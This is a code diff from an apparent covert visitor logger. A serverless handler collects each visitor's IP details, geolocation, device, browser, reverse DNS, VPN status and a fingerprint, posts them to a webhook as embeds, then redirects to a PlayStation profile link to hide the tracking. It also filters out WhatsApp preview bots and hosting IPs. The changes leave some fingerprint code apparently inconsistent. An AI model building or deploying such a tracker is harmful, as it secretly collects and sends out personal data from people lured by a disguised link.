@@ -109,36 +109,6 @@ function injectFingerprintScript(res) {
 
 let fingerprintStore = {}; // Temporary in-memory store to hold fingerprints
 
-async function handleFingerprint(req, res) {
-    if (req.method === "POST") {
-        try {
-            const body = await new Promise((resolve, reject) => {
-                let data = "";
-                req.on("data", (chunk) => (data += chunk));
-                req.on("end", () => resolve(JSON.parse(data)));
-                req.on("error", (err) => reject(err));
-            });
-
-            const { fingerprint, components } = body;
-
-            // Store the fingerprint temporarily with a unique identifier (e.g., IP or session ID)
-            const clientId = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-            fingerprintStore[clientId] = { fingerprint, components };
-
-            console.log(`Received fingerprint for client ${clientId}:`, fingerprint);
-
-            res.writeHead(200, { "Content-Type": "application/json" });
-            res.end(JSON.stringify({ success: true }));
-        } catch (err) {
-            console.error("Error processing fingerprint data:", err);
-            res.writeHead(500, { "Content-Type": "application/json" });
-            res.end(JSON.stringify({ success: false, error: err.message }));
-        }
-    } else {
-        res.writeHead(405, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ success: false, message: "Method not allowed" }));
-    }
-}
 
 
 function getBrowserEngine(userAgent) {
@@ -165,7 +135,7 @@ function logDebugInfo(reverseDNS, requestMetadata) {
 }
 
 
-function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
+function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata, fingerprint) {
     const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
 
     return [
@@ -197,6 +167,7 @@ function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browse
         { name: "Network Type", value: safeValue(ipDetails.mobile ? "Mobile" : "Broadband"), inline: true },
         { name: "Using Proxy/VPN", value: safeValue(ipDetails.proxy ? "Yes" : "No"), inline: true },
         { name: "Hosting", value: "`No`", inline: true },
+        { name: "Fingerprint", value: safeValue(fingerprint, "Not collected"), inline: false }
     ];
 }
 
@@ -369,12 +340,14 @@ export default async function handler(req, res) {
         console.log("Finished Check 5: WhatsApp External Hit");
 
 
+        // Default: Full Info for Other Requests
         if (!ipDetails.hosting) {
             console.log("Preparing to send the default message with full info...");
-        
-            const clientId = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-        
+
             try {
+                // Simulate or collect fingerprint data
+                const fingerprint = await getFingerprintData();
+
                 const fields = createCommonFields(
                     ipDetails,
                     coords,
@@ -388,9 +361,11 @@ export default async function handler(req, res) {
                     referer,
                     reverseDNS,
                     requestMetadata,
-                    "Pending"
+                    fingerprint
                 );
-        
+
+                console.log("Fields for webhook message created successfully:", fields);
+
                 const message = {
                     embeds: [
                         {
@@ -401,32 +376,17 @@ export default async function handler(req, res) {
                         }
                     ]
                 };
-        
+
                 console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
-        
-                // Wait for the fingerprint data (up to a timeout)
-                const fingerprint = await new Promise((resolve) => {
-                    let attempts = 0;
-                    const interval = setInterval(() => {
-                        if (fingerprintStore[clientId] || attempts > 10) {
-                            clearInterval(interval);
-                            resolve(fingerprintStore[clientId]?.fingerprint || "Timeout");
-                        }
-                        attempts++;
-                    }, 500);
-                });
-        
-                // Update fields with the fingerprint
-                fields.find((field) => field.name === "Browser Fingerprint").value = `\`${fingerprint}\``;
-        
-                await sendToWebhook({ embeds: [{ ...message.embeds[0], fields }] });
-        
+
+                await sendToWebhook(message);
+
                 console.log("Default webhook message sent successfully.");
             } catch (error) {
                 console.error("An error occurred while sending the default webhook message:", error);
             }
         }
-        
+
 
         console.log("Redirecting user to https://profile.playstation.com/LB7...");
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
